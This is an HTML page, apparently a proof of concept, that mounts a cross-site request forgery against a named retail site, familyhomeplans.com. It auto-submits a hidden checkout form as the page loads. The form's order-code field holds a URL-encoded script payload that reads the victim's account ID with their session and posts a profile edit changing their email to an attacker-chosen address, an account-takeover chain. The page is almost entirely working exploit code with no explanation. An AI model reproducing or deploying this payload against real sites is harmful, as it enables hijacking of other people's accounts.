<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC â€“ Change Order Code</title>
</head>
<body>
  <form id="csrfForm" action="https://www.familyhomeplans.com/checkout/review.cfm" method="POST">
    <!-- These hidden inputs replicate exactly what the legitimate form sends -->
    <input id="OrderCode" type="hidden" name="OrderCode"   value="">
    <input type="hidden" name="PromoCode"   value="">
    <input type="hidden" name="saveordercode" value="1">
  </form>

  <script>
    const encoded="%22%3E%3Csvg%20visibility=%22hidden%22%20onload=%22(async()=%3E%7Bconst%20r=await%20fetch('/mypage.cfm?tab=2',%7Bcredentials:'include'%7D),h=await%20r.text(),d=new%20DOMParser().parseFromString(h,'text/html'),f=d.getElementsByName('ID')%5B0%5D;if(!f)return;const%20i=f.value,fd=new%20URLSearchParams();fd.set('Notes','');fd.set('x_first_name','');fd.set('x_last_name','');fd.set('t_company','');fd.set('x_address','');fd.set('x_city','');fd.set('x_state','');fd.set('x_zip','');fd.set('x_country','US');fd.set('x_phone','');fd.set('x_email','hacked@mail.com');fd.set('x_ship_to_first_name','');fd.set('x_ship_to_last_name','');fd.set('t_ship_to_company','');fd.set('x_ship_to_address','');fd.set('x_ship_to_city','');fd.set('x_ship_to_state','');fd.set('x_ship_to_zip','');fd.set('x_ship_to_country','US');fd.set('x_ship_to_phone','');fd.set('x_occupation','1');fd.set('license_num','');fd.set('saveprofile','1');fd.set('ID',i);fd.set('t_x_email','hacked@mail.com');fd.set('enter_button','Save%20Address%20Info');fetch('/edit_mypage.cfm',%7Bmethod:'POST',credentials:'include',headers:%7B'Content-Type':'application/x-www-form-urlencoded'%7D,body:fd.toString()%7D).then(res=%3Econsole.log('CSRF',res.status));%7D)();%22%3E%3C/svg%3E%0A";
    const payload = decodeURIComponent(encoded);
    document.getElementById('OrderCode').value = payload;
    // Immediately submit when the page loads
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
